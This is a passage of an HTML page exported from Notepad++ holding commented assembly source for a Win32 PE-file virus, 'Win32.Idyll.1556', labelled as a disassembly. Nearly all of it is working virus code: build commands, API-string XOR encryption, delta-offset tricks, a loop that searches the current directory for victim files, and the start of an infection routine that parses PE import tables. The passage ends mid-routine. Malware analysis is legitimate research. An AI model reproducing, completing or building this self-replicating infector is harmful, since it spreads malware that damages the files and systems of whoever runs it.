<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Win32.Idyll.1556</span><span class="sc0">
</span><span class="sc1">;       disassembly done by peon</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a noninteresting,nonresident infector of PE files.</span><span class="sc0">
</span><span class="sc1">; Infects files in the current directory.No payload or anything interesting.</span><span class="sc0">
</span><span class="sc1">; Assumed to be compiled with /m switch so NOP's after jumps included in the source.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Sorry for the annoying lack of comments-most of the stuff is self-explanatory</span><span class="sc0">
</span><span class="sc1">; (so this is not the one you'll learn w32 coding from)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;compilation:</span><span class="sc0">
</span><span class="sc1">;tasm32 /m /ml idyll.asm</span><span class="sc0">
</span><span class="sc1">;tlink32 idyll,,,import32.lib /Tpe</span><span class="sc0">
</span><span class="sc1">;pewrsec idyll.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">            </span><span class="sc1">;the usual stuff</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc1">;---\   </span><span class="sc0">
                </span><span class="sc1">;    &gt;virus needs these fns to be imported by host</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc1">;---/</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;struc def so no need of inc's</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_find_data</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">_attr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_creatlo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_creathi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastalo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastahi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastwlo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastwhi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_sizehi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;@1C</span><span class="sc0">
    </span><span class="sc5">_sizelo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;@20</span><span class="sc0">
    </span><span class="sc5">_res0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_res1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_fname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;@2C</span><span class="sc0">
    </span><span class="sc5">_fuck</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;idyll allocates less than the real</span><span class="sc0">
</span><span class="sc5">_find_data</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">             </span><span class="sc1">;size of finddata structure</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;tlink32 stuff</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">host_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;we need some fixups like filling fn adds and encrypting api strings</span><span class="sc0">
</span><span class="sc1">;before starting the 1st generation sample</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is where control is received from the loader... X-D</span><span class="sc0">
</span><span class="sc5">fixups</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">idyll_gmh</span><span class="sc0">       </span><span class="sc1">;getmodulehandle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get dispatcher add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">idyll_gmh</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store it as virus does during</span><span class="sc0">
                    </span><span class="sc1">;infection</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">idyll_gpa</span><span class="sc0">       </span><span class="sc1">;getprocaddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">idyll_gpa</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;do the same</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_apinames</span><span class="sc0">   </span><span class="sc1">;ptr to apinames</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">idyll_length_of_apinames</span><span class="sc1">;# of bytes to crypt</span><span class="sc0">
</span><span class="sc5">fixup_xorloop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">17h</span><span class="sc0">      </span><span class="sc1">;crypt byte</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;inc ptr</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">fixup_xorloop</span><span class="sc0">      </span><span class="sc1">;loop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">idyll</span><span class="sc0">           </span><span class="sc1">;launch virus</span><span class="sc0">

</span><span class="sc1">;the author (the false demon prophet) coded a host with 69h bytes of size</span><span class="sc0">
</span><span class="sc1">;i fix this with an org directive</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------- infective code begins here ----------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">idyll_start</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">idyll_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">idyll_end</span><span class="sc4">-</span><span class="sc5">idyll_start</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;idyll main</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_flexible_entry_point</span><span class="sc0"> </span><span class="sc1">;will calculate delta offset</span><span class="sc0">
</span><span class="sc5">idyll_flexible_entry_point</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get offset from stack</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_flexible_entry_point</span><span class="sc0"> </span><span class="sc1">;fix ebp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;perform pop off the stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_hostentry</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;entry point of host</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">idyll_hostentry_load</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get add of instruction to patch</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;fix ptr (seems the author wasnt</span><span class="sc0">
                    </span><span class="sc1">; familiar with equ $-4 stuff)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;patch code for return to host</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_gmh</span><span class="sc4">]</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">idyll_getmodulehandlea_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;store fn add</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_k32string</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;fetch ptr to 'KERNEL32' string</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;pass param</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">idyll_getmodulehandlea_add</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get a handle to KERNEL32.dll</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_k32add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_gpa</span><span class="sc4">]</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">idyll_getprocaddress_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;store fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_xorloop_on_apinames</span><span class="sc0">      </span><span class="sc1">;decrypt api strings</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_lookup_apis</span><span class="sc0">          </span><span class="sc1">;get fn addresses</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_xorloop_on_apinames</span><span class="sc0">      </span><span class="sc1">;encrypt api strings</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_filemask</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;filemask for searches</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_init</span><span class="sc0">             </span><span class="sc1">;init routines</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_hostentry_load</span><span class="sc0">         </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;nops for match</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect</span><span class="sc0">           </span><span class="sc1">;try to infect</span><span class="sc0">
</span><span class="sc5">idyll_mainloop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_findnext</span><span class="sc0">         </span><span class="sc1">;find next victim...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_hostentry_load</span><span class="sc0">                 </span><span class="sc1">;if yes execute host</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect</span><span class="sc0">           </span><span class="sc1">;otherwise infect</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">idyll_mainloop</span><span class="sc0">          </span><span class="sc1">;and loop...</span><span class="sc0">
</span><span class="sc5">idyll_hostentry_load</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;@10F5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;this will be patched by virus</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">;store on TOS</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;jump to host</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;allocate memory for finddata structure and call FindFirstFileA()</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_init</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;@1093(8293)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;store reg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;acces protection:PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">      </span><span class="sc1">;type of allocation:MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">_find_data</span><span class="sc0">    </span><span class="sc1">;size of the region to allocate</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;address of region to reserve or commit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_virtualalloc_add</span><span class="sc4">]</span><span class="sc1">;call VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_finddata_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store add</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_findfirstfilea_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;call FindFirstFileA()</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_findhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;launch FindNextFileA()</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_findnext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_finddata_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store param</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_findhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store param</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_findnextfilea_add</span><span class="sc4">]</span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;back to caller</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;infection routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;@10D3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_sectsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_mapfile</span><span class="sc0">          </span><span class="sc1">;try to map file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_return_failure</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_testfile</span><span class="sc0">         </span><span class="sc1">;file can be infected?</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;eax zero if yes</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">idyll_infect_fail</span><span class="sc0">           </span><span class="sc1">;possibly already infected,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;fetch PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">             </span><span class="sc1">;start of RVA list</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">;ptr to imports RVA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;scan imports for KERNEL32.dll module and GetModuleHandleA + GetProcAddress</span><span class="sc0">
</span><span class="sc1">;fns to patch virus before moving code into the victim </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">idyll_infect_importloop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_findk32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_k32found</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;endmarker?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_fail</span><span class="sc0">                    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">         </span><span class="sc1">;next one..</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">idyll_infect_importloop</span><span class="sc0"> </span><span class="sc1">;and branch</span><span class="sc0">
</span><span class="sc5">idyll_infect_k32found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_gmhstring</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;GetModuleHandleA string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_findimports</span><span class="sc0">       </span><span class="sc1">;find imports rva</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">;size of gmh string</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">idyll_infect_find_fn</span><span class="sc0">       </span><span class="sc1">;find fn</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">idyll_infect_fail</span><span class="sc0">            </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idyll_peheader</span><span class="sc4">]</span><span class="sc0">
